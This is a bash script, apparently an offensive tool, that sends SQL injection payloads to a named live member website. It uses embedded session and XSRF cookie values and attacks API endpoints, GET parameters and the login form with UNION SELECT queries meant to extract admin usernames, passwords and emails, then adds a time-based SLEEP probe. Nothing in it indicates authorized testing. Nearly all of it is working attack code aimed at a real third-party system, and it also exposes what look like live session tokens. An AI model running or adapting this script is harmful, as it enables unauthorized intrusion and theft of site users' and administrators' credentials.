#!/bin/bash

echo "🎯 MULTI-ENDPOINT ADMIN EXTRACTION"
echo "=================================="

# Use the provided cookies
XSRF_TOKEN="eyJpdiI6ImU0Y2VHY2t4TEFmR25zMzI2SmlnM0E9PSIsInZhbHVlIjoieDRHSWNFSDhYM0xHb29wMmMwXC9HRmlScWpuOTBwT2ZoeVRsN2tRb0NvZ2ROcWFFc2h5aVJnU0JLWmhUWFRcL2R0IiwibWFjIjoiZjdmYmQxMmFkODFiNmY0MzNlN2I0NWQzYmZmOGE4MzY4MWQ4ZDA5OTQyNGVkMWIwZmM0NTc1ODU2YTZhM2VhMyJ9"
SESSION_TOKEN="eyJpdiI6IlMrRndEZWE0MWNzcU9VUGFaKzJLTlE9PSIsInZhbHVlIjoiYXRZZ081emlyOERHTFkxV0Z2VnNEUGEyQWh2MDRySHR0RzR4dzFGWVZnV3FvblhsMmhKcGw3Zk9PTUpKNXVnVyIsIm1hYyI6IjJkODY2NjViMTNjMzA4OTc4YTZlNmIwNjRkMGFiMGI5MTE3NDVkOGM2NmVkYjY1N2I0NzNhYjg5NmM0NWFiYmMifQ%3D%3D"

BASE_URL="https://member.panama8888b.co"

echo "🔍 Phase 1: Testing API Endpoints"
echo "================================="

# Test various API endpoints
API_ENDPOINTS=(
    "/api/user/profile"
    "/api/announcement"
    "/api/user/balance"
    "/api/user/history"
    "/api/admin/users"
    "/api/admin/dashboard"
)

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo "📊 Testing endpoint: $endpoint"
    
    # Test with user_id parameter
    response=$(curl -s -w "%{http_code}" -o /tmp/api_response.txt \
      -X POST "$BASE_URL$endpoint" \
      -H "Content-Type: application/json" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
      -d "{\"user_id\":\"1' UNION SELECT username,password,email FROM users WHERE role='admin'--\"}")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/api_response.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 2: Testing GET Parameters"
echo "=================================="

# Test GET parameters on various endpoints
GET_ENDPOINTS=(
    "/user/dashboard?id=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "/user/profile?user=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "/api/user/profile?id=1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
)

for endpoint in "${GET_ENDPOINTS[@]}"; do
    echo "📊 Testing GET endpoint: $endpoint"
    
    response=$(curl -s -w "%{http_code}" -o /tmp/get_response.txt \
      -X GET "$BASE_URL$endpoint" \
      -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
      -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN")
    
    http_code=$(echo "$response" | tail -n1)
    content=$(cat /tmp/get_response.txt)
    
    echo "   HTTP Code: $http_code"
    echo "   Content Length: ${#content}"
    echo "   Content: $content"
    echo ""
done

echo "🔍 Phase 3: Testing POST Parameters"
echo "==================================="

# Test POST parameters on login endpoint
echo "📊 Testing POST on /auth/login with username parameter..."
response=$(curl -s -w "%{http_code}" -o /tmp/post_response.txt \
  -X POST "$BASE_URL/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "username=admin' UNION SELECT username,password,email FROM users WHERE role='admin'--&password=test")

http_code=$(echo "$response" | tail -n1)
content=$(cat /tmp/post_response.txt)

echo "   HTTP Code: $http_code"
echo "   Content Length: ${#content}"
echo "   Content: $content"
echo ""

echo "🔍 Phase 4: Testing JSON Injection"
echo "=================================="

# Test JSON injection
echo "📊 Testing JSON injection on API endpoints..."
response=$(curl -s -w "%{http_code}" -o /tmp/json_response.txt \
  -X POST "$BASE_URL/api/user/profile" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "{\"user_id\":\"1' UNION SELECT username,password,email FROM users WHERE role='admin'--\",\"action\":\"get_profile\"}")

http_code=$(echo "$response" | tail -n1)
content=$(cat /tmp/json_response.txt)

echo "   HTTP Code: $http_code"
echo "   Content Length: ${#content}"
echo "   Content: $content"
echo ""

echo "🔍 Phase 5: Testing Time-based Injection"
echo "========================================"

# Test time-based injection on various endpoints
echo "📊 Testing time-based injection on API endpoints..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/time_response.txt \
  -X POST "$BASE_URL/api/user/profile" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
  -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
  -d "{\"user_id\":\"1' AND (SELECT SLEEP(3) FROM users WHERE role='admin' LIMIT 1)--\"}")

echo "   Response Time: ${time_test}s"

echo ""
echo "🎯 ANALYSIS RESULTS"
echo "=================="

# Check for successful responses
success_count=0
total_tests=0

for file in /tmp/api_response.txt /tmp/get_response.txt /tmp/post_response.txt /tmp/json_response.txt; do
    if [ -f "$file" ]; then
        content=$(cat "$file")
        total_tests=$((total_tests + 1))
        
        if [ "${#content}" -gt 50 ] && [[ "$content" != *"Page Expired"* ]] && [[ "$content" != *"Server Error"* ]]; then
            success_count=$((success_count + 1))
            echo "✅ Potential success found in: $file"
            echo "   Content: $content"
        fi
    fi
done

echo ""
echo "📊 SUCCESS RATE: $success_count/$total_tests"

if [ "$success_count" -gt 0 ]; then
    echo "🎉 POTENTIAL VULNERABILITY DETECTED!"
    echo "   Some endpoints may be vulnerable to SQL injection"
else
    echo "❌ No clear vulnerabilities detected in this round"
fi

# Clean up temp files
rm -f /tmp/api_response.txt /tmp/get_response.txt /tmp/post_response.txt /tmp/json_response.txt /tmp/time_response.txt

echo ""
echo "🎯 MULTI-ENDPOINT ADMIN EXTRACTION COMPLETED!"